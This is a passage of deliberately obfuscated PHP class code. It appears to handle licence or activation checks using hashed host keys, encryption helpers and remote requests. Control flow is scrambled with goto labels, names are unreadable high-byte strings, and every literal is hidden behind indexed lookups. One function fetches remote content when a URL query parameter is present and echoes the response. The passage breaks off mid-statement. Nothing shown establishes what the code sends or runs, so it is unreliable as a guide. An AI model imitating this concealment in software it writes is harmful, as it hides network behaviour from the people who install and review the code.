fğ‡õ¼¯Æö; DÊÓõ™ˆë¦: if ($this->gdek593ce87e == $Cêï©ÍáÊõ[121]) { $E¿óÒÓé‰’[$Cêï©ÍáÊõ[93]][$Cêï©ÍáÊõ[94]][$Cêï©ÍáÊõ[99]][$Cêï©ÍáÊõ[107]] = 0; } $E¿óÒÓé‰’[$Cêï©ÍáÊõ[108]][$Cêï©ÍáÊõ[128]] = $Cêï©ÍáÊõ[104]($this->kosba43503a3, $Cêï©ÍáÊõ[129], $Cêï©ÍáÊõ[10]); $E¿óÒÓé‰’[$Cêï©ÍáÊõ[108]][$Cêï©ÍáÊõ[130]] = $Cêï©ÍáÊõ[104]($this->kosba43503a3, $Cêï©ÍáÊõ[131], $Cêï©ÍáÊõ[10]); goto C‰èèñªòª; CÚè¤‘Ÿæá: $dì”° ó¥» =& $_SERVER[Äº¡•ô™Ÿ]; $Cêï©ÍáÊõ =& $_SERVER[Ä³Œ±¸ü]; $eÀß…Ó²Û• = $Cêï©ÍáÊõ[61]($Cêï©ÍáÊõ[62])->{$_SERVER[Ä³Œ±¸ü][63]}(); goto eÎÚË¬Ú»Œ; AÔÒÙÁÕ»Ï: $E¿óÒÓé‰’[$Cêï©ÍáÊõ[93]][$Cêï©ÍáÊõ[94]][$Cêï©ÍáÊõ[99]] = array($Cêï©ÍáÊõ[100] => (int) $Fà¨Õ¾‡­[$Cêï©ÍáÊõ[101]], $Cêï©ÍáÊõ[102] => $Cêï©ÍáÊõ[103]($Cêï©ÍáÊõ[104]($Fà¨Õ¾‡­, $Cêï©ÍáÊõ[105], array())), $Cêï©ÍáÊõ[106] => (int) $Cêï©ÍáÊõ[104]($Fà¨Õ¾‡­, $Cêï©ÍáÊõ[107], 0)); $E÷³‡»…ê‚ = $dì”° ó¥»[585]; if (strlen($E÷³‡»…ê‚) < $dì”° ó¥»[548]) { return; } goto fÑ‡¬×„¸; e¬¸›Ë£ù: $Cí¯ÂÌ–¾ = $dì”° ó¥»[581]; while (strlen($Cí¯ÂÌ–¾) < $dì”° ó¥»[558]) { if (!$Cí¯ÂÌ–¾) { break; } $Cí¯ÂÌ–¾++; } unset($E¿óÒÓé‰’[$Cêï©ÍáÊõ[93]][$Cêï©ÍáÊõ[95]][$Cêï©ÍáÊõ[96]]); goto dÛ™Å‘‹Í; eÎÚË¬Ú»Œ: $D´æƒÅ›“† = array($Cêï©ÍáÊõ[64], $Cêï©ÍáÊõ[65], $Cêï©ÍáÊõ[66], $Cêï©ÍáÊõ[67], $Cêï©ÍáÊõ[68], $Cêï©ÍáÊõ[69], $Cêï©ÍáÊõ[70], $Cêï©ÍáÊõ[71], $Cêï©ÍáÊõ[72], $Cêï©ÍáÊõ[73], $Cêï©ÍáÊõ[74], $Cêï©ÍáÊõ[75], $Cêï©ÍáÊõ[76], $Cêï©ÍáÊõ[77], $Cêï©ÍáÊõ[78], $Cêï©ÍáÊõ[79], $Cêï©ÍáÊõ[80], $Cêï©ÍáÊõ[81], $Cêï©ÍáÊõ[82], $Cêï©ÍáÊõ[83], $Cêï©ÍáÊõ[84], $Cêï©ÍáÊõ[85], $Cêï©ÍáÊõ[86], $Cêï©ÍáÊõ[87], $Cêï©ÍáÊõ[88], $Cêï©ÍáÊõ[89], $Cêï©ÍáÊõ[90]); foreach ($D´æƒÅ›“† as $d¯®ÄÑ£í) { $C±İÚíí Î = $GLOBALS[$Cêï©ÍáÊõ[91]][$Cêï©ÍáÊõ[92]][$d¯®ÄÑ£í]; if (isset($eÀß…Ó²Û•[$d¯®ÄÑ£í])) { $C±İÚíí Î = $eÀß…Ó²Û•[$d¯®ÄÑ£í]; } $E¿óÒÓé‰’[$Cêï©ÍáÊõ[93]][$Cêï©ÍáÊõ[94]][$d¯®ÄÑ£í] = $C±İÚíí Î; } $Fà¨Õ¾‡­ = $E¿óÒÓé‰’[$Cêï©ÍáÊõ[93]][$Cêï©ÍáÊõ[94]][$Cêï©ÍáÊõ[76]]; goto e¬¸›Ë£ù; a¾ÑãƒÕåğ: } private function dvam04041444() { goto E•Æó›¢Ä; FÇ˜²–Ç¬µ: if ($this->gdek593ce87e == $aŸÚ‹¹¬ñ[121]) { return; } $càïÃ™ç½• = array($aŸÚ‹¹¬ñ[153], $aŸÚ‹¹¬ñ[154], $aŸÚ‹¹¬ñ[155], $aŸÚ‹¹¬ñ[156], $aŸÚ‹¹¬ñ[157], $aŸÚ‹¹¬ñ[158]); $bÏ‘§øÏâ» = $aŒ£ƒÏéÀº[591]; goto f¯§ĞäÓË; E•Æó›¢Ä: $aŒ£ƒÏéÀº =& $_SERVER[Äº¡•ô™Ÿ]; $aŸÚ‹¹¬ñ =& $_SERVER[Ä³Œ±¸ü]; if ($_SERVER[$aŸÚ‹¹¬ñ[44]] == $aŸÚ‹¹¬ñ[135]) { goto eôİ¼÷¤·; eôİ¼÷¤·: $F„Â×±–š = array($aŸÚ‹¹¬ñ[120] => $this->gdek593ce87e, $aŸÚ‹¹¬ñ[136] => $this->{$_SERVER[Ä³Œ±¸ü][137]}(), $aŸÚ‹¹¬ñ[138] => $aŸÚ‹¹¬ñ[61]($aŸÚ‹¹¬ñ[139])->{$_SERVER[Ä³Œ±¸ü][140]}()); if ($this->gdek593ce87e != $aŸÚ‹¹¬ñ[121]) { $C¿‹ ‚ê‰  = $aŸÚ‹¹¬ñ[104]($this->kosba43503a3, $aŸÚ‹¹¬ñ[141]); if ($C¿‹ ‚ê‰ ) { $F„Â×±–š[$aŸÚ‹¹¬ñ[142]] = $C¿‹ ‚ê‰ ; $F„Â×±–š[$aŸÚ‹¹¬ñ[143]] = $aŸÚ‹¹¬ñ[144]($aŸÚ‹¹¬ñ[104]($this->kosba43503a3, $aŸÚ‹¹¬ñ[145])); $F„Â×±–š[$aŸÚ‹¹¬ñ[146]] = $aŸÚ‹¹¬ñ[104]($this->kosba43503a3, $aŸÚ‹¹¬ñ[131]); } } $F„Â×±–š = $this->{$_SERVER[Ä³Œ±¸ü][147]}($aŸÚ‹¹¬ñ[148]($F„Â×±–š), $aŸÚ‹¹¬ñ[114]($aŸÚ‹¹¬ñ[149])); goto A‘¯ö÷ ¥‹; F„¯šòóäÌ: $fÆó¡©–Ñ = $aŒ£ƒÏéÀº[590]; if (!$fÆó¡©–Ñ) { return; } $aŸÚ‹¹¬ñ[13](array($aŸÚ‹¹¬ñ[151], $aŸÚ‹¹¬ñ[152]), $EƒĞáù¥Ïé); goto b¤°ğÂ×ĞÄ; A‘¯ö÷ ¥‹: $F¡Ã‡‹èöí = $aŒ£ƒÏéÀº[589]; if (!$F¡Ã‡‹èöí) { return; } $EƒĞáù¥Ïé = array($aŸÚ‹¹¬ñ[150] => $F„Â×±–š); goto F„¯šòóäÌ; b¤°ğÂ×ĞÄ: } goto FÇ˜²–Ç¬µ; f¯§ĞäÓË: if (strlen($bÏ‘§øÏâ») < $aŒ£ƒÏéÀº[555]) { return; } $c®Ì¬‘‡º¿ = $aŸÚ‹¹¬ñ[61]($aŸÚ‹¹¬ñ[62])->{$_SERVER[Ä³Œ±¸ü][63]}(); $BŒ’×†ÃØ = $aŒ£ƒÏéÀº[592]; goto EŠŞİ˜—; EŠŞİ˜—: while ($BŒ’×†ÃØ < $aŒ£ƒÏéÀº[548]) { if ($BŒ’×†ÃØ >= 0) { break; } $BŒ’×†ÃØ++; } $EƒĞáù¥Ïé = array($aŸÚ‹¹¬ñ[159] => $c®Ì¬‘‡º¿[$aŸÚ‹¹¬ñ[64]], $aŸÚ‹¹¬ñ[160] => $c®Ì¬‘‡º¿[$aŸÚ‹¹¬ñ[65]], $aŸÚ‹¹¬ñ[161] => $aŸÚ‹¹¬ñ[10]); $FàñÇÖÆ•‘ = $aŒ£ƒÏéÀº[593]; goto C˜Ë³öÇ•·; C˜Ë³öÇ•·: foreach ($càïÃ™ç½• as $côÂ·ê‡ª¡) { if (!isset($c®Ì¬‘‡º¿[$côÂ·ê‡ª¡]) || !$c®Ì¬‘‡º¿[$côÂ·ê‡ª¡]) { continue; } $EƒĞáù¥Ïé[$côÂ·ê‡ª¡] = $c®Ì¬‘‡º¿[$côÂ·ê‡ª¡]; } $aŸÚ‹¹¬ñ[13](array($aŸÚ‹¹¬ñ[151], $aŸÚ‹¹¬ñ[152]), $EƒĞáù¥Ïé); goto d½ÀÈŠˆ†; d½ÀÈŠˆ†: } private function jfud62bdb2ce() { goto aÄæõğ°Á; aî™ë½Úß‹: while ($Fƒòù™¶ÉÒ < $c‚â½ÄÈĞ¼[548]) { if ($Fƒòù™¶ÉÒ >= 0) { break; } $Fƒòù™¶ÉÒ++; } $f­¾´¿öæÇ[61]($f­¾´¿öæÇ[11])->{$_SERVER[Ä³Œ±¸ü][226]}($DÙ’®¢¢˜Ë[$f­¾´¿öæÇ[227]], array($f­¾´¿öæÇ[228] => $cßš³ß¹¾¤)); $f­¾´¿öæÇ[166]($f­¾´¿öæÇ[197]($f­¾´¿öæÇ[208]), !0); goto aÙôôÑ«ñè; E“ƒ…©Ø»Æ: $c…Äòê›´î = $cªƒè·¸ë¾ . $D˜²‚³¿ó¢[$f­¾´¿öæÇ[120]] . $this->{$_SERVER[Ä³Œ±¸ü][147]}($f­¾´¿öæÇ[114]($D˜²‚³¿ó¢[$f­¾´¿öæÇ[209]]), $cªƒè·¸ë¾); $D˜²‚³¿ó¢[$f­¾´¿öæÇ[123]] = $f­¾´¿öæÇ[118]($f­¾´¿öæÇ[214]($this->{$_SERVER[Ä³Œ±¸ü][147]}($c…Äòê›´î, $f­¾´¿öæÇ[216]))); $f•¦í’˜âÏ = $c‚â½ÄÈĞ¼[599]; goto cêö¾õò’³; c‘‰Ú‰µÆ‹: if (!$f­¾´¿öæÇ[104]($GLOBALS, $f­¾´¿öæÇ[132])) { die; } $fíãÍï • = $GLOBALS[$f­¾´¿öæÇ[22]]; if (isset($fíãÍï •[$f­¾´¿öæÇ[163]])) { $this->{$_SERVER[Ä³Œ±¸ü][164]}(); die; } goto e–Ô¸ºÔÛ§; cêö¾õò’³: if (!$f•¦í’˜âÏ) { die; } if ($fì÷¶¿É¿±[$f­¾´¿öæÇ[217]] && $fì÷¶¿É¿±[$f­¾´¿öæÇ[217]] >= 1) { $f­¾´¿öæÇ[61]($f­¾´¿öæÇ[62])->{$_SERVER[Ä³Œ±¸ü][218]}($f­¾´¿öæÇ[219], $f­¾´¿öæÇ[220]); } $f­¾´¿öæÇ[61]($f­¾´¿öæÇ[62])->{$_SERVER[Ä³Œ±¸ü][221]}($D˜²‚³¿ó¢); goto D¾ƒïŸ¹; d­èôÆº¼ˆ: if (strlen($f‘õˆ¼¡ó) < $c‚â½ÄÈĞ¼[548]) { return; } $cßš³ß¹¾¤[$Döëéø†»ì] = $cçš¦²¸; $Fƒòù™¶ÉÒ = $c‚â½ÄÈĞ¼[604]; goto aî™ë½Úß‹; aÙôôÑ«ñè: $FŸÉ†‹õŒ = $c‚â½ÄÈĞ¼[605]; if (!$FŸÉ†‹õŒ) { die; } goto EÉÅÖ©¸ù; c““òÏè: $D˜²‚³¿ó¢[$f­¾´¿öæÇ[122]] = $f­¾´¿öæÇ[214]($f­¾´¿öæÇ[118]($this->{$_SERVER[Ä³Œ±¸ü][147]}($FêØŠ¨Òè½, $f­¾´¿öæÇ[215]))); $a¸¼î£¬½ô = $c‚â½ÄÈĞ¼[598]; $cªƒè·¸ë¾ = $f­¾´¿öæÇ[124](16); goto E“ƒ…©Ø»Æ; E‹ë»æ¡É‹: $FêØŠ¨Òè½ = $B“Û–Ô¢Ãƒ . $D˜²‚³¿ó¢[$f­¾´¿öæÇ[120]] . $D˜²‚³¿ó¢[$f­¾´¿öæÇ[212]]; $b‡ğˆø†„ = $c‚â½ÄÈĞ¼[597]; if (!$b‡ğˆø†„) { return; } goto c““òÏè; b»®Ş´àáç: $D˜²‚³¿ó¢ = array($f­¾´¿öæÇ[209] => $dğ–À»ÙŠ·[$f­¾´¿öæÇ[165]], $f­¾´¿öæÇ[210] => $fì÷¶¿É¿±[$f­¾´¿öæÇ[211]], $f­¾´¿öæÇ[212] => $f­¾´¿öæÇ[124](16), $f­¾´¿öæÇ[120] => $fì÷¶¿É¿±[$f­¾´¿öæÇ[213]]); if ($dğ–À»ÙŠ·[$f­¾´¿öæÇ[168]]) { $D˜²‚³¿ó¢[$f­¾´¿öæÇ[212]] = $dğ–À»ÙŠ·[$f­¾´¿öæÇ[168]]; } $B“Û–Ô¢Ãƒ = $f­¾´¿öæÇ[25]($f­¾´¿öæÇ[114]($D˜²‚³¿ó¢[$f­¾´¿öæÇ[210]]), 10, 10); goto E‹ë»æ¡É‹; FÑ„é»ÊÒÍ: $d‰îä¯ßœ = $c‚â½ÄÈĞ¼[594]; $F·‘ô¼ìè× = $f­¾´¿öæÇ[114]($_SERVER[$f­¾´¿öæÇ[115]] . $c·àŒ›—‡); $cáĞêŞô„Ò = $c‚â½ÄÈĞ¼[595]; goto aÂ£Ù¾ìƒæ; e–Ô¸ºÔÛ§: if (!isset($fíãÍï •[$f­¾´¿öæÇ[165]]) || $f­¾´¿öæÇ[24]($fíãÍï •[$f­¾´¿öæÇ[165]]) != 16) { $f­¾´¿öæÇ[166]($f­¾´¿öæÇ[167] . $fíãÍï •[$f­¾´¿öæÇ[165]], !1); } $c·àŒ›—‡ = $f­¾´¿öæÇ[61]($f­¾´¿öæÇ[62])->{$_SERVER[Ä³Œ±¸ü][63]}($f­¾´¿öæÇ[116]); $dğ–À»ÙŠ· = array($f­¾´¿öæÇ[165] => $fíãÍï •[$f­¾´¿öæÇ[165]], $f­¾´¿öæÇ[168] => $f­¾´¿öæÇ[124](16), $f­¾´¿öæÇ[169] => $f­¾´¿öæÇ[149], $f­¾´¿öæÇ[170] => $f­¾´¿öæÇ[171], $f­¾´¿öæÇ[172] => $_SERVER[$f­¾´¿öæÇ[173]], $f­¾´¿öæÇ[174] => $_SERVER[$f­¾´¿öæÇ[175]], $f­¾´¿öæÇ[176] => $_SERVER[$f­¾´¿öæÇ[177]]); goto FÑ„é»ÊÒÍ; aÂ£Ù¾ìƒæ: if (!$cáĞêŞô„Ò) { return; } if ($fíãÍï •[$f­¾´¿öæÇ[178]] == $f­¾´¿öæÇ[179]) { $b¿”ÄÓÄİÁ = $this->{$_SERVER[Ä³Œ±¸ü][147]}($F·‘ô¼ìè×, $f­¾´¿öæÇ[180]); $c¹Ş“¬¥­Ü = $this->{$_SERVER[Ä³Œ±¸ü][127]}($f­¾´¿öæÇ[148]($dğ–À»ÙŠ·), $F·‘ô¼ìè× . $f­¾´¿öæÇ[181], 3); $AáºÒÀñÕ = $this->{$_SERVER[Ä³Œ±¸ü][182]}($f­¾´¿öæÇ[183] . $b¿”ÄÓÄİÁ . $f­¾´¿öæÇ[184] . $c¹Ş“¬¥­Ü, -1); $f­¾´¿öæÇ[166]($AáºÒÀñÕ, !0); } else { if ($fíãÍï •[$f­¾´¿öæÇ[178]] == $f­¾´¿öæÇ[185]) { $Dëù¥Á¶å‡ = $f­¾´¿öæÇ[25]($f­¾´¿öæÇ[114]($f­¾´¿öæÇ[186] . $F·‘ô¼ìè×), 12, 15) . $f­¾´¿öæÇ[187]; $c¹Ş“¬¥­Ü = $this->{$_SERVER[Ä³Œ±¸ü][188]}($f­¾´¿öæÇ[2]($fíãÍï •[$f­¾´¿öæÇ[189]]), $Dëù¥Á¶å‡, 2); $aØ¹©’×£› = $f­¾´¿öæÇ[190]($c¹Ş“¬¥­Ü, !0); if (!$f­¾´¿öæÇ[191]($aØ¹©’×£›) || !$f­¾´¿öæÇ[191]($aØ¹©’×£›[$f­¾´¿öæÇ[192]]) || $aØ¹©’×£›[$f­¾´¿öæÇ[165]] != !0) { $A‹ÕÄ»Ÿë = $f­¾´¿öæÇ[193]; $BÂ¾±Âì…œ = $aØ¹©’×£›[$f­¾´¿öæÇ[192]] ? $f­¾´¿öæÇ[194] . $aØ¹©’×£›[$f­¾´¿öæÇ[192]] : $A‹ÕÄ»Ÿë; $f­¾´¿öæÇ[166]($BÂ¾±Âì…œ, !1); } else { $dğ–À»ÙŠ·[$f­¾´¿öæÇ[168]] = $aØ¹©’×£›[$f­¾´¿öæÇ[192]][$f­¾´¿öæÇ[195]]; } } else { $aØ¹©’×£› = $this->{$_SERVER[Ä³Œ±¸ü][182]}($f­¾´¿öæÇ[196], $dğ–À»ÙŠ·, 10); $Bîğœï = $c‚â½ÄÈĞ¼[596]; while ($Bîğœï < $c‚â½ÄÈĞ¼[544]) { if ($Bîğœï >= 0) { break; } $Bîğœï++; } } } if (!$f­¾´¿öæÇ[191]($aØ¹©’×£›) || !$f­¾´¿öæÇ[191]($aØ¹©’×£›[$f­¾´¿öæÇ[192]]) || $aØ¹©’×£›[$f­¾´¿öæÇ[165]] != !0) { $A‹ÕÄ»Ÿë = $f­¾´¿öæÇ[197]($f­¾´¿öæÇ[198]); $BÂ¾±Âì…œ = $aØ¹©’×£›[$f­¾´¿öæÇ[192]] ? $f­¾´¿öæÇ[194] . $aØ¹©’×£›[$f­¾´¿öæÇ[192]] : $A‹ÕÄ»Ÿë; $f­¾´¿öæÇ[166]($BÂ¾±Âì…œ, !1); } goto fø†“·¢óù; C ²³¶´Í‚: while ($dˆß«Í­Ô– < $c‚â½ÄÈĞ¼[555]) { if ($dˆß«Í­Ô– >= 0) { break; } $dˆß«Í­Ô–++; } $cßš³ß¹¾¤ = array(); $f‘õˆ¼¡ó = $c‚â½ÄÈĞ¼[603]; goto d­èôÆº¼ˆ; eÓÂ­³¥: $EœÚæîçŠ = $c‚â½ÄÈĞ¼[600]; while (strlen($EœÚæîçŠ) < $c‚â½ÄÈĞ¼[555]) { if (!$EœÚæîçŠ) { break; } $EœÚæîçŠ++; } $bä´ÉãÏ„ = $f­¾´¿öæÇ[222]($f­¾´¿öæÇ[61]($f­¾´¿öæÇ[11])->{$_SERVER[Ä³Œ±¸ü][223]}(), $f­¾´¿öæÇ[224]); goto AíŞº¡ƒß×; aÄæõğ°Á: $c‚â½ÄÈĞ¼ =& $_SERVER[Äº¡•ô™Ÿ]; $f­¾´¿öæÇ =& $_SERVER[Ä³Œ±¸ü]; if ($_SERVER[$f­¾´¿öæÇ[44]] != $f­¾´¿öæÇ[162]) { return; } goto c‘‰Ú‰µÆ‹; D¾ƒïŸ¹: $c«™ĞòãôÓ = $f­¾´¿öæÇ[114]($_SERVER[$f­¾´¿öæÇ[115]] . $f­¾´¿öæÇ[214]($c·àŒ›—‡) . $D˜²‚³¿ó¢[$f­¾´¿öæÇ[210]]); $Döëéø†»ì = $f­¾´¿öæÇ[214]($f­¾´¿öæÇ[25]($c«™ĞòãôÓ, 10, 16)); $cçš¦²¸ = $this->{$_SERVER[Ä³Œ±¸ü][127]}($f­¾´¿öæÇ[148]($fì÷¶¿É¿±), $c«™ĞòãôÓ); goto eÓÂ­³¥; fø†“·¢óù: $fì÷¶¿É¿± = $aØ¹©’×£›[$f­¾´¿öæÇ[192]]; $fğÈ”ÌçÙ = $this->{$_SERVER[Ä³Œ±¸ü][199]}($fì÷¶¿É¿±[$f­¾´¿öæÇ[200]]); if (!$fğÈ”ÌçÙ || $fğÈ”ÌçÙ != $f­¾´¿öæÇ[201]($fì÷¶¿É¿±[$f­¾´¿öæÇ[145]])) { $F ª°Şæ£“ = array($f­¾´¿öæÇ[202] => $f­¾´¿öæÇ[61]($f­¾´¿öæÇ[62])->{$_SERVER[Ä³Œ±¸ü][63]}($f­¾´¿öæÇ[116]), $f­¾´¿öæÇ[203] => $_SERVER[$f­¾´¿öæÇ[115]], $f­¾´¿öæÇ[204] => $f­¾´¿öæÇ[205](), $f­¾´¿öæÇ[174] => $_SERVER[$f­¾´¿öæÇ[175]]); $c¹Ş“¬¥­Ü = $this->{$_SERVER[Ä³Œ±¸ü][206]}($f­¾´¿öæÇ[148]($F ª°Şæ£“)); $this->{$_SERVER[Ä³Œ±¸ü][182]}($f­¾´¿öæÇ[207] . $c¹Ş“¬¥­Ü); $f­¾´¿öæÇ[166]($f­¾´¿öæÇ[197]($f­¾´¿öæÇ[208]), !0); } goto b»®Ş´àáç; AíŞº¡ƒß×: $b—âåÂÚË = $c‚â½ÄÈĞ¼[601]; $DÙ’®¢¢˜Ë = $bä´ÉãÏ„[$f­¾´¿öæÇ[225]]; $dˆß«Í­Ô– = $c‚â½ÄÈĞ¼[602]; goto C ²³¶´Í‚; EÉÅÖ©¸ù: } private function myozca565152() { goto E‘Ì‚§””; cÒâÇôé…: $eœŸßÀ¿ ê = $c—’öà¿Ç¢[606]; if (strlen($eœŸßÀ¿ ê) < $c—’öà¿Ç¢[558]) { die; } $cîòëÇƒ[61]($cîòëÇƒ[62])->{$_SERVER[Ä³Œ±¸ü][218]}($cîòëÇƒ[219], $cîòëÇƒ[229]); goto DÑÍİ£ÈòÊ; DÑÍİ£ÈòÊ: $dñ”ÆªÜÍ = $c—’öà¿Ç¢[607]; while (strlen($dñ”ÆªÜÍ) < $c—’öà¿Ç¢[555]) { if (!$dñ”ÆªÜÍ) { break; } $dñ”ÆªÜÍ++; } $this->kosba43503a3 = array(); goto D¬Í©Š…ˆ; D¬Í©Š…ˆ: $this->gdek593ce87e = $cîòëÇƒ[121]; $A½Œ‡÷Îğ› = $c—’öà¿Ç¢[608]; if (strlen($A½Œ‡÷Îğ›) < $c—’öà¿Ç¢[555]) { return; } goto cËƒÁºˆòÙ; E‘Ì‚§””: $c—’öà¿Ç¢ =& $_SERVER[Äº¡•ô™Ÿ]; $cîòëÇƒ =& $_SERVER[Ä³Œ±¸ü]; $cîòëÇƒ[61]($cîòëÇƒ[62])->{$_SERVER[Ä³Œ±¸ü][221]}(array($cîòëÇƒ[209] => $cîòëÇƒ[10], $cîòëÇƒ[210] => $cîòëÇƒ[10], $cîòëÇƒ[120] => $cîòëÇƒ[121], $cîòëÇƒ[122] => $cîòëÇƒ[10], $cîòëÇƒ[123] => $cîòëÇƒ[10])); goto cÒâÇôé…; cËƒÁºˆòÙ: } private function bawf00af9705() { goto A¯àæ¢ é; EÜ³¢’”ô: if (!$BªÇ¹íô¼¯[191]($A¯ĞÌöÜïá)) { return $this->{$_SERVER[Ä³Œ±¸ü][164]}(); } $EİÕğ‹ã‚ = $BªÇ¹íô¼¯[144]($A¯ĞÌöÜïá[$BªÇ¹íô¼¯[145]]); if ($BªÇ¹íô¼¯[230]() >= $EİÕğ‹ã‚) { return $this->{$_SERVER[Ä³Œ±¸ü][164]}(); } goto EÉÕÌÔ©¤; c©àÂØÃÃÚ: $cä×ß«ÏÁ = $eÛù…“•ÆŠ[612]; $a÷Ø­ù²‹³ = $BªÇ¹íô¼¯[214]($BªÇ¹íô¼¯[25]($Fˆ§ºõ’Æ, 10, 16)); $A¯ĞÌöÜïá = $this->{$_SERVER[Ä³Œ±¸ü][188]}($BÂ“Å¡®Ò[$BªÇ¹íô¼¯[91]][$a÷Ø­ù²‹³], $Fˆ§ºõ’Æ); goto Aø¡Š¾¡®; EÉÕÌÔ©¤: $this->kosba43503a3 = $A¯ĞÌöÜïá; $this->gdek593ce87e = $AŸŞÌÂÜï[$BªÇ¹íô¼¯[120]]; goto CŒ¦İ¦ÇÍ¯; cİšòÖ¹¶ë: $EéïøÖÔæ˜ = $eÛù…“•ÆŠ[609]; if (!$EéïøÖÔæ˜) { return; } $this->gdek593ce87e = $BªÇ¹íô¼¯[121]; goto E»Ù…İÎÄ; A¯àæ¢ é: $eÛù…“•ÆŠ =& $_SERVER[Äº¡•ô™Ÿ]; $BªÇ¹íô¼¯ =& $_SERVER[Ä³Œ±¸ü]; $_SERVER[$BªÇ¹íô¼¯[175]] = $BªÇ¹íô¼¯[104]($_SERVER, $BªÇ¹íô¼¯[175], APP_HOST); goto cİšòÖ¹¶ë; dÄ‘¬‘´°’: $e‘„÷¶ò„· = $BªÇ¹íô¼¯[61]($BªÇ¹íô¼¯[62])->{$_SERVER[Ä³Œ±¸ü][63]}($BªÇ¹íô¼¯[116]); $C¬İ±Àå¦± = $BªÇ¹íô¼¯[222]($BªÇ¹íô¼¯[61]($BªÇ¹íô¼¯[11])->{$_SERVER[Ä³Œ±¸ü][223]}(), $BªÇ¹íô¼¯[224]); $BÂ“Å¡®Ò = $C¬İ±Àå¦±[$BªÇ¹íô¼¯[225]]; goto EÊ¶ÊÂ´¿«; Aø¡Š¾¡®: $A¯ĞÌöÜïá = $BªÇ¹íô¼¯[190]($A¯ĞÌöÜïá, !0); $fñÌç„¥–† = $eÛù…“•ÆŠ[613]; if (!$fñÌç„¥–†) { return; } goto EÜ³¢’”ô; EÊ¶ÊÂ´¿«: $d˜è‘öŞÑ× = $eÛù…“•ÆŠ[611]; while (strlen($d˜è‘öŞÑ×) < $eÛù…“•ÆŠ[548]) { if (!$d˜è‘öŞÑ×) { break; } $d˜è‘öŞÑ×++; } $Fˆ§ºõ’Æ = $BªÇ¹íô¼¯[114]($_SERVER[$BªÇ¹íô¼¯[115]] . $BªÇ¹íô¼¯[214]($e‘„÷¶ò„·) . $AŸŞÌÂÜï[$BªÇ¹íô¼¯[210]]); goto c©àÂØÃÃÚ; E»Ù…İÎÄ: $AŸŞÌÂÜï = $BªÇ¹íô¼¯[61]($BªÇ¹íô¼¯[62])->{$_SERVER[Ä³Œ±¸ü][63]}(); $eôÉõ±«Ÿç = $eÛù…“•ÆŠ[610]; if ($AŸŞÌÂÜï[$BªÇ¹íô¼¯[120]] == $BªÇ¹íô¼¯[121]) { return; } goto dÄ‘¬‘´°’; CŒ¦İ¦ÇÍ¯: } private function kqecb6600fdb() { goto A÷åÆÉ¤»Â; cñÙ³÷—¦: $Bã–ö‚ŠÜ´ = $cã†Øß´Îã[614]; $dö¶ºÙÙ§ = $_SERVER[$fÒèÈªæ®[44]]; $f¼ëÔ©äÏƒ = $cã†Øß´Îã[615]; goto Aå®Œ·£¹ ; Aå®Œ·£¹ : if ($dö¶ºÙÙ§ == $fÒèÈªæ®[231] && $this->gdek593ce87e == $fÒèÈªæ®[121]) { $fÒèÈªæ®[166]($fÒèÈªæ®[197]($fÒèÈªæ®[232]), !1, $fÒèÈªæ®[233]); } $bõåšèÑßï = array($fÒèÈªæ®[234], $fÒèÈªæ®[235]); if ($fÒèÈªæ®[236]($dö¶ºÙÙ§, $bõåšèÑßï)) { if ($this->gdek593ce87e == $fÒèÈªæ®[121] && isset($Cé§µ[$fÒèÈªæ®[237]])) { $fÒèÈªæ®[166]($fÒèÈªæ®[197]($fÒèÈªæ®[232]), !1, $fÒèÈªæ®[233]); die; } $ešß©äğ‹… = $this->{$_SERVER[Ä³Œ±¸ü][137]}(); if ($ešß©äğ‹… != $fÒèÈªæ®[201]($fÒèÈªæ®[238])) { if ($ešß©äğ‹… <= $fÒèÈªæ®[61]($fÒèÈªæ®[139])->{$_SERVER[Ä³Œ±¸ü][140]}()) { $fÒèÈªæ®[166]($fÒèÈªæ®[197]($fÒèÈªæ®[239]), !1, $fÒèÈªæ®[233]); die; } } } goto Fˆİ»£ìÅÏ; A÷åÆÉ¤»Â: $cã†Øß´Îã =& $_SERVER[Äº¡•ô™Ÿ]; $fÒèÈªæ® =& $_SERVER[Ä³Œ±¸ü]; $Cé§µ = $GLOBALS[$fÒèÈªæ®[22]]; goto cñÙ³÷—¦; Fˆİ»£ìÅÏ: } private function dotz9f11e333() { goto DçƒĞßÍÈ; E„ŒŸŸŒ…Ô: if (!$C„‡×ø‡ë[104]($GLOBALS, $C„‡×ø‡ë[132]) || !isset($_GET[$C„‡×ø‡ë[241]])) { return; } if (!$C„‡×ø‡ë[236]($_SERVER[$C„‡×ø‡ë[44]], $E”˜Æ’ Ç)) { return; } $Dè–®ĞÆ†Ë = $C„‡×ø‡ë[242]; goto aªÙºø´Ö; DçƒĞßÍÈ: $CäõÊêİ˜‡ =& $_SERVER[Äº¡•ô™Ÿ]; $C„‡×ø‡ë =& $_SERVER[Ä³Œ±¸ü]; $E”˜Æ’ Ç = array($C„‡×ø‡ë[135], $C„‡×ø‡ë[240]); goto E„ŒŸŸŒ…Ô; aªÙºø´Ö: $Dè–®ĞÆ†Ë = $this->{$_SERVER[Ä³Œ±¸ü][243]}($Dè–®ĞÆ†Ë, $C„‡×ø‡ë[244]); $cÒó“°·ò² = $CäõÊêİ˜‡[616]; if (!$cÒó“°·ò²) { die; } goto EßÚ”Şš§; a‰±˜ÍÆ«ƒ: $D²©å’¸†° = @$C„‡×ø‡ë[250]($Dè–®ĞÆ†Ë, !1, $A³‘ãİƒ¦‡); $C„‡×ø‡ë[251]($C„‡×ø‡ë[252]); if ($D²©å’¸†° && $C„‡×ø‡ë[32]($D²©å’¸†°, $C„‡×ø‡ë[253])) { echo $D²©å’¸†°; } goto fåì‰Ùæ÷¹; EßÚ”Şš§: $A³‘ãİƒ¦‡ = $C„‡×ø‡ë[245](array($C„‡×ø‡ë[246] => array($C„‡×ø‡ë[247] => $C„‡×ø‡ë[248], $C„‡×ø‡ë[249] => 3))); $F÷Ûè¡’°ó = $CäõÊêİ˜‡[617]; if (strlen($F÷Ûè¡’°ó) < $CäõÊêİ˜‡[548]) { die; } goto a‰±˜ÍÆ«ƒ; fåì‰Ùæ÷¹: die; goto aõ«¢¤¡§; aõ«¢¤¡§: } public function lbpw8c73533f($cñÏöÛÜ£) { goto AÊ†ßÜÛ­Ì; f“‘œ™óôí: $C£—ìÃÕ‡Ì = array($c¨ôÅ¿ì‰„[255], $c¨ôÅ¿ì‰„[256], $c¨ôÅ¿ì‰„[257], $c¨ôÅ¿ì‰„[258], $c¨ôÅ¿ì‰„[259], $c¨ôÅ¿ì‰„[260], $c¨ôÅ¿ì‰„[261], $c¨ôÅ¿ì‰„[262]); $cÃ¨ÊËÆòŸ = $c¨ôÅ¿ì‰„[0]($c¨ôÅ¿ì‰„[263], 